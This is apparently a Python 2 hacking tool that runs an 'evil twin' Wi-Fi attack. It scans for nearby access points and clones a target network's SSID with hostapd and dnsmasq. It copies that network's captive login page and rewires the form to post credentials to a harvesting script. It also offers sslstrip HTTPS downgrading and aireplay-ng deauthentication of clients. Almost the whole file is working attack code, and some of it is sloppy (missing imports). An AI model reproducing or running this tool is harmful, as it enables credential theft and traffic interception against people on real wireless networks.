from scapy.all import *
import os
import time
from subprocess import *
from bs4 import BeautifulSoup
__author__      = "khalilov aka entropy1337"
print '*'*20
print '*'*20
print '''

'####:'##::: ##:'########:'########:'########::'##::: ##::::'###::::'##::::::::::'##:::::'##:'####:'########::'########:'##:::::::'########::'######:::'######::
. ##:: ###:: ##: ##.....:: ##.....:: ##.... ##: ###:: ##:::'## ##::: ##:::::::::: ##:'##: ##:. ##:: ##.... ##: ##.....:: ##::::::: ##.....::'##... ##:'##... ##:
: ##:: ####: ##: ##::::::: ##::::::: ##:::: ##: ####: ##::'##:. ##:: ##:::::::::: ##: ##: ##:: ##:: ##:::: ##: ##::::::: ##::::::: ##::::::: ##:::..:: ##:::..::
: ##:: ## ## ##: ######::: ######::: ########:: ## ## ##:'##:::. ##: ##:::::::::: ##: ##: ##:: ##:: ########:: ######::: ##::::::: ######:::. ######::. ######::
: ##:: ##. ####: ##...:::: ##...:::: ##.. ##::: ##. ####: #########: ##:::::::::: ##: ##: ##:: ##:: ##.. ##::: ##...:::: ##::::::: ##...:::::..... ##::..... ##:
: ##:: ##:. ###: ##::::::: ##::::::: ##::. ##:: ##:. ###: ##.... ##: ##:::::::::: ##: ##: ##:: ##:: ##::. ##:: ##::::::: ##::::::: ##:::::::'##::: ##:'##::: ##:
'####: ##::. ##: ##::::::: ########: ##:::. ##: ##::. ##: ##:::: ##: ########::::. ###. ###::'####: ##:::. ##: ########: ########: ########:. ######::. ######::
....::..::::..::..::::::::........::..:::::..::..::::..::..:::::..::........::::::...::...:::....::..:::::..::........::........::........:::......::::......:::
        

'''

import create_db_hotspot
import urllib2, httplib, redirecthandle

####### SET UP A MONITORING INTERFACE
print '*'*20
print 'Creating a monitoring interface'
output = Popen(["iwconfig"], stdout=PIPE).communicate()[0]
wireless_interface = ""
mon_iface = ""
if "wlan" in output:
	#print "The network inteface is: " + output[0:5]
	wireless_interface = output[0:6].strip()
print "\n\n"
print "EVIL TWIN ATTACK"	
print "\n\n"
print "Using wireless interface:::" + wireless_interface
print "\n\n"


mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]

if 'mon' in mon_interface:
	print mon_interface[-33:-1].strip()
	mon_iface = mon_interface[-7:-2].strip(")")

print '*'*20
print "SCANNING FOR WIRELESS NETWORKS"
print '*'*20

print "press Ctrl+C to stop scanning"

######## SCAN FOR SSID
app_list = []
def PacketHandler(pkt):
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype==8:
			if pkt.addr2 not in app_list:
				app_list.append(pkt.addr2)
				print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)

sniff(iface=mon_iface, prn= PacketHandler)

time.sleep(3)
os.system('airmon-ng stop ' + mon_iface)
######## creating a necessary files;
print '*'*20
print "Making a backup of DHCPD and hostapd files"

#os.system("mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.backup")

# GET USER INPUT FOR SSID

SSID = raw_input('Enter the target SSID: ')
CHANNEL = raw_input('Enter the channel for SSID: ')
hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid="+SSID+"\nchannel=1\n#enable_karma=1\n"
hostapd.write(config_file)
hostapd.close()
os.system("service hostapd start")
print "service hostapd start started"

time.sleep(10)
os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd

cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""")

os.system("service dnsmasq start")

print "service dnsmasq start started"

time.sleep(5)

os.system("""ifconfig wlan0 up
ifconfig wlan0 10.0.0.1/24

iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo '1' > /proc/sys/net/ipv4/ip_forward""")




################ CONNECT TO WIRELESS NETWORK #########
def connect_wireless():
	os.system("iwconfig "+wireless_interface+" essid " + SSID)

	
	#os.system("sudo iw dev "+wireless_interface+" disconnect")
	print '*'*20
	print 'Connected to :' + SSID + ' on interface ' + wireless_interface
	
	time.sleep(5)
	
	
#######  HANDLE REDIRECT 
def get_login_page():
	
	httplib.HTTPConnection.debuglevel=1
	request = urllib2.Request('http://localhost/login.html')
	opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
	f = opener.open(request)
	##article = re.sub(r'(?is)</html>.+', '</html>', article)
	redirect = f.url
	##response = urllib2.urlopen('https://google.com')
	html = f.read()
	print "Found the login page here: " + f.url
	########## regex search and replace
	regex = re.search(r'action="([^"]*)".*?', html)
	post_action = str(regex.group(0))
	
	print "*" * 20
	print 'modifying the login page...'
	new_login = html.replace(post_action, 'action=getcreds.php') 
	##### create a login page
	index_page = open('/var/www/index.html','wb')
	index_page.write(new_login)
	index_page.close()
	
	############# MOFIYING THE POST SCRIPT
	
	myhtml = open('/var/www/index.html', 'r')

	read_html = myhtml.read()

	myhtml.close()

	number = 0

	html_proc = BeautifulSoup(read_html)

	inputs =  html_proc.findAll('input')	


	for i in inputs:
		print str(number) +": " +str(i)
		number = number + 1
	
	#username_select = input('Please choose the username or email ID in numeric representation: ')
		
	user = str(raw_input('Please enter the username / email of the target script:')).strip()
	password = str(raw_input('Please enter the password of the target script: ')).strip()
	
	tmp = read_html.replace('name="'+user+'"','name="username"').replace('name="'+password+'"', 'name="password"')
	
	new_page = open('/var/www/index.html', 'wb')
	new_page.write(tmp)
	new_page.close()

	time.sleep(3)


########## CONNECTING TO THE WIRELESS NETWORK

def bring_internet_down():
	os.system('ifconfig eth0 down')

def bring_internet_up():
	os.system('ifconfig eth0 up')
	os.system('dhclient eth0')
	time.sleep(10)
	os.system('ifconfig eth0')


######## getting login page



print '*'*20
print 'Getting login page'

get_login_page()

os.system('firefox http://localhost/index.html &')

######### bring internet up here

#bring_internet_up()


# CREATE A HOTSPOT IN A NEW TERMINAL
time.sleep(5)
print '*'*20
print 'setting up redirect NAT rule'

os.system("""iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE""")

time.sleep(10)

def sslstrip():
	print "setting up SSLSTRIP NAT rule"
	os.system("""iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
	iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
	iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT""")

	os.system("gnome-terminal -x sslstrip -akf")

def deauthenticate_ssid():
	os.system('aireplay-ng -0 10 -e ' + SSID)


	
	
command = str(raw_input('Enter 1 for sslstrip\nEnter 2 for Deauthentication Request\nEnter 3 to Exit'))


while True:
	if command == '1':
		sslstrip()
		command = str(raw_input('Enter 1 for sslstrip\nEnter 2 for Deauthentication Request\nEnter 3 to Exit'))
	if command == '2':
		command = str(raw_input('Enter 1 for sslstrip\nEnter 2 for Deauthentication Request\nEnter 3 to Exit'))
		deauthenticate_ssid()
	if command == '3':
		command = str(raw_input('Enter 1 for sslstrip\nEnter 2 for Deauthentication Request\nEnter 3 to Exit'))
		sys.exit()
